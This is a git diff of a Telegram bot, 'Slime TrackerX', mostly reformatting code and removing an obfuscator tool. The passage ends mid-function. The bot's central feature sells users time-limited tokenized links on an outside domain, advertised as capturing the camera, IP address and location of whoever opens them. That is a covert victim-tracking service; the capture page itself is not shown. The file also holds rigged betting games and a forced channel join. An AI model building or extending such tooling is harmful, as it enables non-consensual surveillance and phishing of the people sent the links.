@@ -1,10 +1,6 @@
 // =====================================================
 // 🟢⚡ SLIME TRACKERX v6.0 ⚡🟢
-// 💻 CYBER ANALYTICS CORE - ULTIMATE EDITION
-// =====================================================
-// 👑 Dev: @Mrddev | 📢 Updates: @devxtechzone
-// 🤖 Bot: @trackersxbot
-// 🎮 INTERACTIVE GAMES | 🛠 DEV TOOLS | 👑 GROUP TOOLS
+// 💻 CYBER ANALYTICS CORE - FULLY WORKING
 // =====================================================
 
 const { Telegraf, Markup } = require("telegraf");
@@ -19,11 +15,10 @@ const app = express();
 app.use(bodyParser.json({ limit: "50mb" }));
 app.use(express.static(path.join(__dirname, "public")));
 
-// ========== CONFIG ==========
+// ===== CONFIG =====
 const DOMAIN = process.env.DOMAIN || "https://virtualnumbersfree.onrender.com";
 const CHANNEL = process.env.CHANNEL || "@devxtechzone";
-const OWNER = parseInt(process.env.OWNER_ID) || 6170894121;
-const VERSION = "6.0.0";
+const OWNER_ID = parseInt(process.env.OWNER_ID) || 6170894121;
 
 // ========== COINS ==========
 const TRACK_COST = 5;
@@ -34,7 +29,7 @@ const WORK_MIN = 1;
 const WORK_MAX = 2;
 const WORK_CD = 6 * 60 * 60 * 1000;
 
-// ========== DATABASES ==========
+// ========== ALL DATABASES (FULLY DECLARED) ==========
 let users = new Map();
 let tokens = new Map();
 let codes = new Map();
@@ -48,8 +43,9 @@ let goodbye = new Map();
 let tagCD = new Map();
 let banned = new Set();
 let gameSessions = new Map();
+let afk = new Map();           // <--- FIXED: added afk
 let notes = new Map();
-let reminders = new Map();
+let activeChats = new Map();
 
 let stats = {
   start: Date.now(),
@@ -60,28 +56,51 @@ let stats = {
   games: 0
 };
 
+// Clean tokens
 setInterval(() => {
   let now = Date.now();
-  for (let [k, v] of tokens) if (now - v.time > 600000) tokens.delete(k);
+  for (let [k, v] of tokens) {
+    if (now - v.time > 600000) tokens.delete(k);
+  }
 }, 60000);
 
 // ========== HELPERS ==========
-function refLink(id) { return `https://t.me/${bot.botInfo?.username || 'trackersxbot'}?start=ref_${id}`; }
-function fmt(t) { return t.trim(); }
-function genToken() { return crypto.randomBytes(8).toString("hex"); }
-async function getName(id) {
-  try { let c = await bot.telegram.getChat(id); return c.username || `User_${id}`; } 
-  catch { return `User_${id}`; }
+function refLink(id) {
+  return `https://t.me/${bot.botInfo?.username || 'trackersxbot'}?start=ref_${id}`;
 }
 
-// ========== USER INIT ==========
+function genToken() {
+  return crypto.randomBytes(8).toString("hex");
+}
+
+async function getName(id) {
+  try {
+    let chat = await bot.telegram.getChat(id);
+    return chat.username || `User_${id}`;
+  } catch {
+    return `User_${id}`;
+  }
+}
+
+// ========== USER SYSTEM ==========
 function initUser(id, ref = null) {
   if (!users.has(id)) {
     let data = {
-      id, join: Date.now(), coins: NEW_COINS, bank: 0, totalEarned: NEW_COINS, totalSpent: 0,
-      refs: 0, referrer: ref, hacks: 0, level: 1, xp: 0,
-      streak: 0, lastDaily: null, games: 0, wins: 0, losses: 0,
-      obfuscations: 0, badges: ["🎁 New User"]
+      id: id,
+      join: Date.now(),
+      coins: NEW_COINS,
+      totalEarned: NEW_COINS,
+      refs: 0,
+      referrer: ref,
+      hacks: 0,
+      level: 1,
+      xp: 0,
+      streak: 0,
+      lastDaily: null,
+      games: 0,
+      wins: 0,
+      losses: 0,
+      badges: ["🎁 New User"]
     };
     users.set(id, data);
     stats.users++;
@@ -102,23 +121,40 @@ function initUser(id, ref = null) {
   return users.get(id);
 }
 
-function addCoin(id, amt) { let u = users.get(id); if (u) { u.coins += amt; u.totalEarned += amt; users.set(id, u); stats.coins += amt; return true; } return false; }
-function takeCoin(id, amt) { let u = users.get(id); if (u && u.coins >= amt) { u.coins -= amt; u.totalSpent += amt; users.set(id, u); return true; } return false; }
-function canHack(id) { let u = users.get(id); return u && u.coins >= TRACK_COST; }
-function useHack(id) { let u = users.get(id); if (u && u.coins >= TRACK_COST) { u.coins -= TRACK_COST; u.hacks++; users.set(id, u); stats.hacks++; return true; } return false; }
-
-function addXP(id, amt) {
+function addCoin(id, amt) {
   let u = users.get(id);
   if (u) {
-    u.xp += amt;
-    let need = u.level * 100;
-    if (u.xp >= need) {
-      u.xp -= need;
-      u.level++;
-      u.coins += u.level * 2;
-      bot.telegram.sendMessage(id, `🎉 LEVEL UP! Level ${u.level}! +${u.level * 2} COINS`);
-    }
+    u.coins += amt;
+    u.totalEarned += amt;
     users.set(id, u);
+    stats.coins += amt;
+    return true;
+  }
+  return false;
+}
+
+function takeCoin(id, amt) {
+  let u = users.get(id);
+  if (u && u.coins >= amt) {
+    u.coins -= amt;
+    users.set(id, u);
+    return true;
+  }
+  return false;
+}
+
+function canHack(id) {
+  let u = users.get(id);
+  return u && u.coins >= TRACK_COST;
+}
+
+function useHack(id) {
+  let u = users.get(id);
+  if (u && u.coins >= TRACK_COST) {
+    u.coins -= TRACK_COST;
+    u.hacks++;
+    users.set(id, u);
+    stats.hacks++;
     return true;
   }
   return false;
@@ -126,7 +162,13 @@ function addXP(id, amt) {
 
 function genCode(coins, uses = 20, hours = 24) {
   let code = crypto.randomBytes(6).toString("hex").toUpperCase();
-  codes.set(code, { coins, used: [], max: Math.min(uses, 20), left: Math.min(uses, 20), expire: Date.now() + (hours * 3600000) });
+  codes.set(code, {
+    coins: coins,
+    used: [],
+    max: Math.min(uses, 20),
+    left: Math.min(uses, 20),
+    expire: Date.now() + (hours * 3600000)
+  });
   return code;
 }
 
@@ -143,50 +185,23 @@ function redeemCode(id, code) {
   return { ok: true, msg: `✅ +${c.coins} COINS`, coins: c.coins };
 }
 
-// ========== OBFUSCATOR ==========
-function obfuscate(code) {
-  try {
-    let ob = code.replace(/\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/\s+/g, ' ');
-    let vars = new Set();
-    let regex = /\b(let|const|var)\s+([a-zA-Z_][a-zA-Z0-9_]*)/g;
-    let m;
-    while ((m = regex.exec(ob)) !== null) vars.add(m[2]);
-    let map = new Map();
-    for (let v of vars) map.set(v, '_' + crypto.randomBytes(4).toString('hex'));
-    for (let [old, neu] of map) ob = ob.replace(new RegExp(`\\b${old}\\b`, 'g'), neu);
-    ob = ob.replace(/(['"])(.*?)\1/g, (_, q, s) => `atob('${Buffer.from(s).toString('base64')}')`);
-    return { ok: true, ob, orig: code.length, new: ob.length, comp: Math.round((1 - ob.length / code.length) * 100) };
-  } catch(e) { return { ok: false, error: e.message }; }
-}
-
-function minify(code) {
-  try {
-    let min = code.replace(/\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/\s+/g, ' ').replace(/;\s*/g, ';').replace(/\{\s+/g, '{').replace(/\s+\}/g, '}').trim();
-    return { ok: true, min };
-  } catch(e) { return { ok: false, error: e.message }; }
-}
-
-function validate(code) {
-  try { new Function(code); return { ok: true }; } 
-  catch(e) { return { ok: false, error: e.message }; }
-}
-
 // ========== JOIN CHECK ==========
 async function checkJoin(ctx) {
   try {
     let m = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
     return ["creator", "administrator", "member"].includes(m.status);
-  } catch { return false; }
+  } catch {
+    return false;
+  }
 }
 
 // ========== MENUS ==========
 function mainMenu(ctx) {
   let link = refLink(ctx.from.id);
   return Markup.inlineKeyboard([
-    [Markup.button.callback("🎯 TRACK", "track"), Markup.button.callback("👑 GROUP", "group")],
-    [Markup.button.callback("🎮 GAMES", "games"), Markup.button.callback("💰 ECO", "eco")],
-    [Markup.button.callback("🏆 LEADERBOARD", "leader"), Markup.button.callback("🛠 DEV TOOLS", "dev")],
-    [Markup.button.callback("👤 PROFILE", "profile"), Markup.button.callback("📊 STATS", "stats")],
+    [Markup.button.callback("🎯 TRACKING", "track"), Markup.button.callback("👑 GROUP", "group")],
+    [Markup.button.callback("🎮 GAMES", "games"), Markup.button.callback("💰 ECONOMY", "eco")],
+    [Markup.button.callback("🏆 LEADERBOARD", "lead"), Markup.button.callback("👤 PROFILE", "prof")],
     [Markup.button.callback("🎁 REDEEM", "redeem"), Markup.button.callback("🔗 REFERRAL", "refinfo")],
     [Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone"), Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev")],
     [Markup.button.url("📋 MY LINK", link)]
@@ -223,11 +238,11 @@ function gamesMenu() {
 function ecoMenu() {
   return Markup.inlineKeyboard([
     [Markup.button.callback("💰 DAILY", "daily"), Markup.button.callback("💼 WORK", "work")],
-    [Markup.button.callback("🏆 TOP COINS", "topc"), Markup.button.callback("◀️ BACK", "back")]
+    [Markup.button.callback("🏆 LEADERBOARD", "leadc"), Markup.button.callback("◀️ BACK", "back")]
   ]);
 }
 
-function leaderMenu() {
+function leadMenu() {
   return Markup.inlineKeyboard([
     [Markup.button.callback("💰 COINS", "topc"), Markup.button.callback("🎮 GAMES", "topg")],
     [Markup.button.callback("👥 REFERRALS", "topr"), Markup.button.callback("⭐ LEVEL", "topl")],
@@ -235,30 +250,25 @@ function leaderMenu() {
   ]);
 }
 
-function devMenu() {
-  return Markup.inlineKeyboard([
-    [Markup.button.callback("🔒 OBFUSCATE", "obf"), Markup.button.callback("🗜️ MINIFY", "min")],
-    [Markup.button.callback("✅ VALIDATE", "val"), Markup.button.callback("🔐 ENCRYPT", "enc")],
-    [Markup.button.callback("🔓 DECRYPT", "dec"), Markup.button.callback("📝 BASE64", "b64")],
-    [Markup.button.callback("🔢 HASH", "hash"), Markup.button.callback("⏰ TIMESTAMP", "ts")],
-    [Markup.button.callback("🎲 RANDOM", "rand"), Markup.button.callback("📋 NOTE", "note")],
-    [Markup.button.callback("⏰ REMINDER", "rem"), Markup.button.callback("💤 AFK", "afk")],
-    [Markup.button.callback("🔍 WHOIS", "whois"), Markup.button.callback("📊 SYSTEM", "sys")],
-    [Markup.button.callback("◀️ BACK", "back")]
-  ]);
-}
-
 // ========== MIDDLEWARE ==========
 bot.use(async (ctx, next) => {
-  if (!ctx.from || ctx.chat?.type === "channel") return next();
+  if (!ctx.from) return next();
+  if (ctx.chat?.type === "channel") return next();
   if (ctx.callbackQuery?.data === "join") return next();
   
-  if (banned.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
+  if (banned.has(ctx.from.id)) {
+    return ctx.reply("🚫 You are banned!");
+  }
   
   let joined = await checkJoin(ctx);
   if (!joined) {
     return ctx.reply(`🚫 ACCESS LOCKED\n\n🔐 Join: ${CHANNEL}`, {
-      reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }, { text: "✅ JOINED", callback_data: "join" }]] }
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "📢 JOIN", url: "https://t.me/devxtechzone" },
+          { text: "✅ JOINED", callback_data: "join" }
+        ]]
+      }
     });
   }
   return next();
@@ -268,189 +278,347 @@ bot.use(async (ctx, next) => {
 bot.start(async (ctx) => {
   let ref = null;
   let args = ctx.message.text.split(" ");
-  if (args[1]?.startsWith("ref_")) ref = parseInt(args[1].replace("ref_", ""));
+  if (args[1] && args[1].startsWith("ref_")) {
+    ref = parseInt(args[1].replace("ref_", ""));
+  }
   let user = initUser(ctx.from.id, ref);
+  
   await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
     caption: `🟢⚡ SLIME TRACKERX ⚡🟢\n💻 CYBER ANALYTICS CORE\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 📊 Lvl ${user.level} | 👥 ${user.refs} refs\n🎁 +${NEW_COINS} FREE coins!\n\n🔗 ${refLink(ctx.from.id)}\n\n🎯 Select module`,
-    parse_mode: "HTML", ...mainMenu(ctx)
+    parse_mode: "HTML",
+    ...mainMenu(ctx)
   });
 });
 
 bot.action("join", async (ctx) => {
-  if (!await checkJoin(ctx)) return ctx.answerCbQuery("❌ Join first!", true);
+  if (!await checkJoin(ctx)) {
+    return ctx.answerCbQuery("❌ Join first!", true);
+  }
   await ctx.answerCbQuery("✅ Access!");
   await ctx.deleteMessage();
   let user = initUser(ctx.from.id);
   await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
     caption: `✅ Access Unlocked!\n💰 ${user.coins} coins\n🎯 Select module`,
-    parse_mode: "HTML", ...mainMenu(ctx)
+    parse_mode: "HTML",
+    ...mainMenu(ctx)
   });
 });
 
 // ========== NAVIGATION ==========
 bot.action("track", async (ctx) => {
-  try { await ctx.editMessageCaption("🎯 TRACKING\n\n⚠️ 5 coins\n⏱️ 10min\n📸 Camera + IP + Location", { parse_mode: "HTML", ...trackMenu() }); } 
-  catch { await ctx.reply("🎯 TRACKING\n\n⚠️ 5 coins\n⏱️ 10min\n📸 Camera + IP + Location", { parse_mode: "HTML", ...trackMenu() }); }
+  try {
+    await ctx.editMessageCaption("🎯 TRACKING\n\n⚠️ 5 coins\n⏱️ 10min\n📸 Camera + IP + Location", {
+      parse_mode: "HTML",
+      ...trackMenu()
+    });
+  } catch {
+    await ctx.reply("🎯 TRACKING\n\n⚠️ 5 coins\n⏱️ 10min\n📸 Camera + IP + Location", {
+      parse_mode: "HTML",
+      ...trackMenu()
+    });
+  }
 });
 
 bot.action("group", async (ctx) => {
-  try { await ctx.editMessageCaption("👑 GROUP TOOLS\n\nAdmin tools for moderation!", { parse_mode: "HTML", ...groupMenu() }); } 
-  catch { await ctx.reply("👑 GROUP TOOLS\n\nAdmin tools for moderation!", { parse_mode: "HTML", ...groupMenu() }); }
+  try {
+    await ctx.editMessageCaption("👑 GROUP TOOLS\n\nAdmin tools for moderation!", {
+      parse_mode: "HTML",
+      ...groupMenu()
+    });
+  } catch {
+    await ctx.reply("👑 GROUP TOOLS\n\nAdmin tools for moderation!", {
+      parse_mode: "HTML",
+      ...groupMenu()
+    });
+  }
 });
 
 bot.action("games", async (ctx) => {
-  try { await ctx.editMessageCaption("🎮 GAMES ZONE\n\n💰 Bet any amount | Win big!\n🎲 Click a game to play!", { parse_mode: "HTML", ...gamesMenu() }); } 
-  catch { await ctx.reply("🎮 GAMES ZONE\n\n💰 Bet any amount | Win big!\n🎲 Click a game to play!", { parse_mode: "HTML", ...gamesMenu() }); }
+  try {
+    await ctx.editMessageCaption("🎮 GAMES ZONE\n\n💰 Bet any amount | Win big!", {
+      parse_mode: "HTML",
+      ...gamesMenu()
+    });
+  } catch {
+    await ctx.reply("🎮 GAMES ZONE\n\n💰 Bet any amount | Win big!", {
+      parse_mode: "HTML",
+      ...gamesMenu()
+    });
+  }
 });
 
 bot.action("eco", async (ctx) => {
   let u = initUser(ctx.from.id);
-  try { await ctx.editMessageCaption(`💰 ECONOMY\n\n💰 Balance: ${u.coins} coins\n📈 Earned: ${u.totalEarned}\n\nDaily: ${DAILY_REWARD} | Work: ${WORK_MIN}-${WORK_MAX}/6h | Referral: ${REF_REWARD}`, { parse_mode: "HTML", ...ecoMenu() }); } 
-  catch { await ctx.reply(`💰 ECONOMY\n\n💰 Balance: ${u.coins} coins\n📈 Earned: ${u.totalEarned}`, { parse_mode: "HTML", ...ecoMenu() }); }
+  try {
+    await ctx.editMessageCaption(`💰 ECONOMY\n\n💰 Balance: ${u.coins} coins\n📈 Earned: ${u.totalEarned}\n\nDaily: ${DAILY_REWARD} | Work: ${WORK_MIN}-${WORK_MAX}/6h | Referral: ${REF_REWARD}`, {
+      parse_mode: "HTML",
+      ...ecoMenu()
+    });
+  } catch {
+    await ctx.reply(`💰 ECONOMY\n\n💰 Balance: ${u.coins} coins\n📈 Earned: ${u.totalEarned}`, {
+      parse_mode: "HTML",
+      ...ecoMenu()
+    });
+  }
 });
 
-bot.action("leader", async (ctx) => {
-  try { await ctx.editMessageCaption("🏆 LEADERBOARDS\n\nTop users!", { parse_mode: "HTML", ...leaderMenu() }); } 
-  catch { await ctx.reply("🏆 LEADERBOARDS\n\nTop users!", { parse_mode: "HTML", ...leaderMenu() }); }
+bot.action("lead", async (ctx) => {
+  try {
+    await ctx.editMessageCaption("🏆 LEADERBOARDS\n\nTop users!", {
+      parse_mode: "HTML",
+      ...leadMenu()
+    });
+  } catch {
+    await ctx.reply("🏆 LEADERBOARDS\n\nTop users!", {
+      parse_mode: "HTML",
+      ...leadMenu()
+    });
+  }
 });
 
-bot.action("dev", async (ctx) => {
-  try { await ctx.editMessageCaption("🛠 DEV TOOLS\n\nProfessional tools!", { parse_mode: "HTML", ...devMenu() }); } 
-  catch { await ctx.reply("🛠 DEV TOOLS\n\nProfessional tools!", { parse_mode: "HTML", ...devMenu() }); }
+bot.action("prof", async (ctx) => {
+  let u = initUser(ctx.from.id);
+  let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0;
+  await ctx.reply(`👤 PROFILE\n\n📝 ${ctx.from.first_name}\n🆔 ${ctx.from.id}\n\n💰 ${u.coins} coins\n📊 Level ${u.level}\n👥 ${u.refs} refs\n🔧 ${u.hacks} hacks\n🎮 ${u.wins}W/${u.losses}L (${winRate}%)\n\n🏆 Badges:\n${u.badges.map(b => `• ${b}`).join('\n')}`, {
+    parse_mode: "HTML",
+    ...Markup.inlineKeyboard([[Markup.button.callback("🔄 REFRESH", "prof"), Markup.button.callback("◀️ BACK", "back")]])
+  });
 });
 
 bot.action("back", async (ctx) => {
   let u = initUser(ctx.from.id);
-  try { await ctx.editMessageCaption(`🟢⚡ SLIME TRACKERX ⚡🟢\n💻 CYBER ANALYTICS CORE\n\n💰 ${u.coins} coins | 📊 Lvl ${u.level} | 👥 ${u.refs} refs\n\n🎯 Select module`, { parse_mode: "HTML", ...mainMenu(ctx) }); } 
-  catch { await ctx.reply(`🟢⚡ SLIME TRACKERX ⚡🟢\n💻 CYBER ANALYTICS CORE\n\n💰 ${u.coins} coins | 📊 Lvl ${u.level} | 👥 ${u.refs} refs\n\n🎯 Select module`, { parse_mode: "HTML", ...mainMenu(ctx) }); }
+  try {
+    await ctx.editMessageCaption(`🟢⚡ SLIME TRACKERX ⚡🟢\n💻 CYBER ANALYTICS CORE\n\n💰 ${u.coins} coins | 📊 Lvl ${u.level} | 👥 ${u.refs} refs\n\n🎯 Select module`, {
+      parse_mode: "HTML",
+      ...mainMenu(ctx)
+    });
+  } catch {
+    await ctx.reply(`🟢⚡ SLIME TRACKERX ⚡🟢\n💻 CYBER ANALYTICS CORE\n\n💰 ${u.coins} coins | 📊 Lvl ${u.level} | 👥 ${u.refs} refs\n\n🎯 Select module`, {
+      parse_mode: "HTML",
+      ...mainMenu(ctx)
+    });
+  }
 });
 
 // ========== TRACKING ==========
 bot.action("pool", async (ctx) => {
-  if (!canHack(ctx.from.id)) return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
+  if (!canHack(ctx.from.id)) {
+    return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
+  }
   useHack(ctx.from.id);
   let token = genToken();
   tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, time: Date.now() });
   setTimeout(() => tokens.delete(token), 600000);
-  await ctx.reply(`🎱 POOL MODE\n\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n\n🔗 ${DOMAIN}?token=${token}`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]]) });
+  await ctx.reply(`🎱 POOL MODE\n\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n\n🔗 ${DOMAIN}?token=${token}`, {
+    parse_mode: "HTML",
+    ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]])
+  });
 });
 
 bot.action("norm", async (ctx) => {
-  if (!canHack(ctx.from.id)) return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
+  if (!canHack(ctx.from.id)) {
+    return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
+  }
   useHack(ctx.from.id);
   let token = genToken();
   tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, time: Date.now() });
   setTimeout(() => tokens.delete(token), 600000);
-  await ctx.reply(`⚡ NORMAL MODE\n\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n\n🔗 ${DOMAIN}?token=${token}`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]]) });
+  await ctx.reply(`⚡ NORMAL MODE\n\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n\n🔗 ${DOMAIN}?token=${token}`, {
+    parse_mode: "HTML",
+    ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]])
+  });
 });
 
 // ========== GAMES ==========
 bot.action("dice", async (ctx) => {
-  await ctx.reply("🎲 DICE\n\n💰 Bet amount\nUse: /dice <amount>\n\nExample: /dice 10");
+  await ctx.reply("🎲 DICE\n\nUse: /dice <amount>\nExample: /dice 10");
 });
+
 bot.command("dice", async (ctx) => {
   let u = initUser(ctx.from.id);
   let args = ctx.message.text.split(" ");
   let bet = parseInt(args[1]);
   if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice <amount>");
   if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
+  
   takeCoin(ctx.from.id, bet);
   let roll = Math.floor(Math.random() * 6) + 1;
   let win = roll === 6;
-  if (win) { let w = bet * 2; addCoin(ctx.from.id, w); u.wins++; await ctx.replyWithDice(); await ctx.reply(`🎲 ${roll} WIN! +${w} coins`); }
-  else { u.losses++; await ctx.replyWithDice(); await ctx.reply(`🎲 ${roll} LOST! -${bet} coins`); }
-  u.games++; users.set(ctx.from.id, u); stats.games++;
+  
+  if (win) {
+    let w = bet * 2;
+    addCoin(ctx.from.id, w);
+    u.wins++;
+    await ctx.replyWithDice();
+    await ctx.reply(`🎲 ${roll} WIN! +${w} coins`);
+  } else {
+    u.losses++;
+    await ctx.replyWithDice();
+    await ctx.reply(`🎲 ${roll} LOST! -${bet} coins`);
+  }
+  u.games++;
+  users.set(ctx.from.id, u);
 });
 
 bot.action("slots", async (ctx) => {
-  await ctx.reply("🎰 SLOTS\n\nUse: /slots <amount>");
+  await ctx.reply("🎰 SLOTS\n\nUse: /slots <amount>\nExample: /slots 10");
 });
+
 bot.command("slots", async (ctx) => {
   let u = initUser(ctx.from.id);
   let args = ctx.message.text.split(" ");
   let bet = parseInt(args[1]);
   if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /slots <amount>");
   if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
+  
   takeCoin(ctx.from.id, bet);
   let s = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"];
-  let r = [s[Math.floor(Math.random()*6)], s[Math.floor(Math.random()*6)], s[Math.floor(Math.random()*6)]];
-  let jack = r[0]===r[1] && r[1]===r[2];
-  let pair = !jack && (r[0]===r[1] || r[1]===r[2] || r[0]===r[2]);
-  if (jack) { let w = bet * 10; addCoin(ctx.from.id, w); u.wins++; await ctx.reply(`🎰 JACKPOT! ${r.join(" ")} +${w}`); }
-  else if (pair) { let w = bet * 2; addCoin(ctx.from.id, w); u.wins++; await ctx.reply(`🎰 PAIR! ${r.join(" ")} +${w}`); }
-  else { u.losses++; await ctx.reply(`🎰 ${r.join(" ")} LOST! -${bet}`); }
-  u.games++; users.set(ctx.from.id, u); stats.games++;
+  let r = [
+    s[Math.floor(Math.random() * 6)],
+    s[Math.floor(Math.random() * 6)],
+    s[Math.floor(Math.random() * 6)]
+  ];
+  let jack = r[0] === r[1] && r[1] === r[2];
+  let pair = !jack && (r[0] === r[1] || r[1] === r[2] || r[0] === r[2]);
+  
+  if (jack) {
+    let w = bet * 10;
+    addCoin(ctx.from.id, w);
+    u.wins++;
+    await ctx.reply(`🎰 JACKPOT! ${r.join(" ")} +${w} coins`);
+  } else if (pair) {
+    let w = bet * 2;
+    addCoin(ctx.from.id, w);
+    u.wins++;
+    await ctx.reply(`🎰 PAIR! ${r.join(" ")} +${w} coins`);
+  } else {
+    u.losses++;
+    await ctx.reply(`🎰 ${r.join(" ")} LOST! -${bet} coins`);
+  }
+  u.games++;
+  users.set(ctx.from.id, u);
 });
 
 bot.action("guess", async (ctx) => {
-  await ctx.reply("🔢 GUESS\n\nUse: /guess <amount> <1-10>\n\nExample: /guess 10 7");
+  await ctx.reply("🔢 GUESS\n\nUse: /guess <amount> <1-10>\nExample: /guess 10 7");
 });
+
 bot.command("guess", async (ctx) => {
   let u = initUser(ctx.from.id);
   let args = ctx.message.text.split(" ");
   let bet = parseInt(args[1]);
   let guess = parseInt(args[2]);
-  if (isNaN(bet) || bet < 1 || isNaN(guess) || guess < 1 || guess > 10) return ctx.reply("❌ Usage: /guess <amount> <1-10>");
+  
+  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /guess <amount> <1-10>");
+  if (isNaN(guess) || guess < 1 || guess > 10) return ctx.reply("Guess 1-10!");
   if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
+  
   takeCoin(ctx.from.id, bet);
   let num = Math.floor(Math.random() * 10) + 1;
-  if (guess === num) { let w = bet * 5; addCoin(ctx.from.id, w); u.wins++; await ctx.reply(`🎉 Correct! ${num} WIN! +${w}`); }
-  else { u.losses++; await ctx.reply(`❌ Wrong! ${num} LOST! -${bet}`); }
-  u.games++; users.set(ctx.from.id, u); stats.games++;
+  
+  if (guess === num) {
+    let w = bet * 5;
+    addCoin(ctx.from.id, w);
+    u.wins++;
+    await ctx.reply(`🎉 Correct! ${num} WIN! +${w} coins`);
+  } else {
+    u.losses++;
+    await ctx.reply(`❌ Wrong! ${num} LOST! -${bet} coins`);
+  }
+  u.games++;
+  users.set(ctx.from.id, u);
 });
 
 bot.action("rps", async (ctx) => {
-  await ctx.reply("✊ RPS\n\nUse: /rps <amount> <rock/paper/scissors>\n\nExample: /rps 10 rock");
+  await ctx.reply("✊ RPS\n\nUse: /rps <amount> <rock/paper/scissors>\nExample: /rps 10 rock");
 });
+
 bot.command("rps", async (ctx) => {
   let u = initUser(ctx.from.id);
   let args = ctx.message.text.split(" ");
   let bet = parseInt(args[1]);
   let choice = args[2]?.toLowerCase();
-  if (isNaN(bet) || bet < 1 || !["rock","paper","scissors"].includes(choice)) return ctx.reply("❌ Usage: /rps <amount> <rock/paper/scissors>");
+  
+  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /rps <amount> <rock/paper/scissors>");
+  if (!["rock", "paper", "scissors"].includes(choice)) return ctx.reply("Choose rock/paper/scissors!");
   if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
+  
   takeCoin(ctx.from.id, bet);
-  let botChoice = ["rock","paper","scissors"][Math.floor(Math.random()*3)];
+  let botChoice = ["rock", "paper", "scissors"][Math.floor(Math.random() * 3)];
   let result;
+  
   if (choice === botChoice) result = "tie";
-  else if ((choice==="rock" && botChoice==="scissors") || (choice==="paper" && botChoice==="rock") || (choice==="scissors" && botChoice==="paper")) result = "win";
+  else if ((choice === "rock" && botChoice === "scissors") || (choice === "paper" && botChoice === "rock") || (choice === "scissors" && botChoice === "paper")) result = "win";
   else result = "lose";
-  if (result === "win") { let w = bet * 2; addCoin(ctx.from.id, w); u.wins++; await ctx.reply(`✊ ${choice} vs ${botChoice} WIN! +${w}`); }
-  else if (result === "lose") { u.losses++; await ctx.reply(`✊ ${choice} vs ${botChoice} LOST! -${bet}`); }
-  else { addCoin(ctx.from.id, bet); await ctx.reply(`✊ ${choice} vs ${botChoice} TIE! Coins back`); }
-  u.games++; users.set(ctx.from.id, u); stats.games++;
+  
+  if (result === "win") {
+    let w = bet * 2;
+    addCoin(ctx.from.id, w);
+    u.wins++;
+    await ctx.reply(`✊ ${choice} vs ${botChoice} WIN! +${w} coins`);
+  } else if (result === "lose") {
+    u.losses++;
+    await ctx.reply(`✊ ${choice} vs ${botChoice} LOST! -${bet} coins`);
+  } else {
+    addCoin(ctx.from.id, bet);
+    await ctx.reply(`✊ ${choice} vs ${botChoice} TIE! Coins back`);
+  }
+  u.games++;
+  users.set(ctx.from.id, u);
 });
 
 bot.action("flip", async (ctx) => {
-  await ctx.reply("🪙 FLIP\n\nUse: /flip <amount>\n\nExample: /flip 10");
+  await ctx.reply("🪙 FLIP\n\nUse: /flip <amount>\nExample: /flip 10");
 });
+
 bot.command("flip", async (ctx) => {
   let u = initUser(ctx.from.id);
   let args = ctx.message.text.split(" ");
   let bet = parseInt(args[1]);
   if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /flip <amount>");
   if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
+  
   takeCoin(ctx.from.id, bet);
   let flip = Math.random() < 0.4 ? "HEADS" : "TAILS";
-  if (flip === "HEADS") { let w = bet * 2; addCoin(ctx.from.id, w); u.wins++; await ctx.reply(`🪙 ${flip} WIN! +${w}`); }
-  else { u.losses++; await ctx.reply(`🪙 ${flip} LOST! -${bet}`); }
-  u.games++; users.set(ctx.from.id, u); stats.games++;
+  
+  if (flip === "HEADS") {
+    let w = bet * 2;
+    addCoin(ctx.from.id, w);
+    u.wins++;
+    await ctx.reply(`🪙 ${flip} WIN! +${w} coins`);
+  } else {
+    u.losses++;
+    await ctx.reply(`🪙 ${flip} LOST! -${bet} coins`);
+  }
+  u.games++;
+  users.set(ctx.from.id, u);
 });
 
 bot.action("risk", async (ctx) => {
-  await ctx.reply("🔥 HIGH RISK\n\nUse: /risk <amount>\n\nExample: /risk 10");
+  await ctx.reply("🔥 HIGH RISK\n\nUse: /risk <amount>\nExample: /risk 10");
 });
+
 bot.command("risk", async (ctx) => {
   let u = initUser(ctx.from.id);
   let args = ctx.message.text.split(" ");
   let bet = parseInt(args[1]);
   if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /risk <amount>");
   if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
+  
   takeCoin(ctx.from.id, bet);
   let win = Math.random() < 0.2;
